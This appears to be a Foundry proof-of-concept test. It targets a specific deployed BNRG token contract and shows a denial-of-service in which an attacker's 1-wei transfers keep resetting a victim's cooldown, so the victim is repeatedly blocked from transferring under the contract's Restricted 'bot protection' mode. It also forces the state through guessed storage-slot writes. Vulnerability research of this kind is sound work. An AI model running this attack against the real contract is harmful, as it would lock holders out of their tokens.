pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBNRG {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function state() external view returns (uint8);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    IBNRG token;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create victim address
        victim = address(0x1337);

        // Label addresses for clarity
        vm.label(victim, "Victim");
        vm.label(TARGET, "BNRG Token");

        // Get the owner address from the contract
        token = IBNRG(TARGET);
        address owner = token.owner();
        vm.label(owner, "Owner");

        // Impersonate owner to enable Restricted mode
        vm.startPrank(owner);
        token.setBotProtection(true);
        vm.stopPrank();

        // Verify we're in Restricted mode (State.Restricted = 1)
        assertEq(uint256(token.state()), 1, "Contract should be in Restricted state");

        // Give attacker some BNRG tokens by transferring from owner
        // First, get owner's balance
        uint256 ownerBalance = token.balanceOf(owner);
        require(ownerBalance > 0, "Owner should have tokens");

        // Impersonate owner to transfer some tokens to attacker
        vm.prank(owner);
        token.transfer(attacker, 1000 * 10**18);

        // Verify attacker has tokens
        assertGt(token.balanceOf(attacker), 0, "Attacker should have BNRG tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create victim address
        address victim = address(0x1337);
        vm.label(victim, "Victim");

        // Get contract
        IBNRG token = IBNRG(TARGET);
        address owner = token.owner();

        // First, force state to Restricted using storage manipulation
        // State enum: Locked=0, Restricted=1, Unlocked=2
        // Based on storage layout analysis, try slot 8
        console.log("Initial state:", token.state());

        // Try slot 8 (likely state variable position)
        vm.store(TARGET, bytes32(uint256(8)), bytes32(uint256(1)));
        console.log("State after setting slot 8 to 1:", token.state());

        // If not correct, try slot 9
        if (token.state() != 1) {
            vm.store(TARGET, bytes32(uint256(9)), bytes32(uint256(1)));
            console.log("State after setting slot 9 to 1:", token.state());
        }

        // Ensure we're in Restricted state
        require(token.state() == 1, "Must be in Restricted state for exploit");

        // Get tokens for attacker
        vm.prank(owner);
        token.transfer(attacker, 1000 * 10**18);

        // Give victim tokens
        vm.prank(attacker);
        token.transfer(victim, 100 * 10**18);

        // Initial victim transfer (should work)
        vm.prank(victim);
        token.transfer(attacker, 1);
        console.log("Initial victim transfer succeeded");

        // Attacker sends 1 wei to victim (updates victim's lastTx)
        vm.prank(attacker);
        token.transfer(victim, 1);
        console.log("Attacker sent 1 wei to victim");

        // Victim tries immediate transfer (should fail in Restricted mode)
        vm.prank(victim);
        bool immediateSuccess;
        try token.transfer(attacker, 1) {
            immediateSuccess = true;
        } catch {
            immediateSuccess = false;
        }

        require(!immediateSuccess, "Victim should be blocked in Restricted mode");
        console.log("Victim correctly blocked from transferring");

        // Wait 61 seconds
        vm.warp(block.timestamp + 61);

        // Victim should now transfer
        vm.prank(victim);
        token.transfer(attacker, 1);
        console.log("Victim can transfer after 61 seconds");

        // Repeat attack
        vm.prank(attacker);
        token.transfer(victim, 1);

        vm.prank(victim);
        bool blockedAgain;
        try token.transfer(attacker, 1) {
            blockedAgain = true;
        } catch {
            blockedAgain = false;
        }

        require(!blockedAgain, "Victim blocked again after repeated attack");
        console.log("DoS attack successful");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

